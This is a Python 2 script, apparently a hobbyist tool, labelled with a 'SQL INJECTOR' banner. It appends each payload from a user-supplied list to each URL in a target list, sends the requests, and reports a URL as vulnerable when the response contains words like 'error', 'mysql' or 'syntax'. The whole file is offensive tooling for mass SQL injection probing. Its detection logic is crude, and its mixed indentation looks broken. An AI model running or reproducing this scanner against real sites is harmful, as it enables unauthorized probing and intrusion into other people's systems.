#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import sys
import colorama
from colorama import Fore, Back, Style
colorama.init()

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'}

# merge payload with target host
def merge(s,c) :
  global a
  global b
  a = requests.get(s+c)
  b = requests.get(s + c, headers=header).text.lower()

def sqlfunc():
      print"""\x1b[31;1m                                      
      
 ██████   █████   ██▓        ██▓ ███▄    █  ▄▄▄██▀▀▀▓█████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▀███  
▒██    ▒ ▒██▓  ██▒▓██▒       ▓██▒ ██ ▀█   █    ▒██   ▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
░ ▓██▄   ▒██▒  ██░▒██░       ▒██▒▓██  ▀█ ██▒   ░██   ▒███   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
  ▒   ██▒░██  █▀ ░▒██░       ░██░▓██▒  ▐▌██▒▓██▄██▓  ▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
▒██████▒▒░▒███▒█▄ ░██████▒   ░██░▒██░   ▓██░ ▓███▒   ░▒████▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░   ░▓  ░ ▒░   ▒ ▒  ▒▓▒▒░   ░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░    ▒ ░░ ░░   ░ ▒░ ▒ ░▒░    ░ ░  ░  ░  ▒       ░      ░ ▒ ▒░   ░▒ ░ ▒░
░  ░  ░     ░   ░   ░ ░       ▒ ░   ░   ░ ░  ░ ░ ░      ░   ░          ░      ░ ░ ░ ▒    ░░   ░ 
      ░      ░        ░  ░    ░           ░  ░   ░      ░  ░░ ░                   ░ ░     ░     
                                                            ░                                   

             
           
      \x1b[0m   
       """
      t_list = raw_input("\n"+Fore.RED+"Enter target  list path : "+ Style.RESET_ALL)
      p_list = raw_input("\n"+Fore.RED+"Enter payload list path : "+ Style.RESET_ALL)
      target_list = open(t_list)
      try:
        with target_list as targets:
             for target in targets :
                  with open(p_list) as payloads:
                    for payload in payloads:
                        clean_target = target.strip()
                        merge(clean_target,payload)
                        print '********************************************************'
                        print '\x1b[32m                     \x1b[0m' 
                        print '\x1b[32m INJECT :   ┣▇▇▇═──  \x1b[0m' + str(clean_target+payload)
			if 'error' in b or 'syntax' in b or 'mysql' in b or 'warning' in b:
				print '\x1b[31;1m '+'URL is Vulnerble:   \x1b[0m'+str(clean_target+payload)+'\n'

      except KeyboardInterrupt:
          print "\n"+Fore.GREEN+"Good Bye ;)"
          sys.exit()



